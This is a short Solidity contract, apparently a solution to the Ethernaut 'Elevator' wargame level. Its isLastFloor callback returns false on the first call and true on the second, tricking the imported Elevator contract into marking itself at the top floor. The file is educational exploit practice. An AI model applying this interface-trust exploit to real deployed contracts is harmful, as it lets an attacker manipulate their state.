// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Elevator.sol';

contract OnlyUp {
  uint numCalls = 0;

  function elevate(address _elevator) public {
    Elevator(_elevator).goTo(1);
  }

  function isLastFloor(uint _floor) public returns (bool) {
    if (numCalls < 1) {
      numCalls++;
      return false;
    } else {
      numCalls--;
      return true;
    }
  }
}
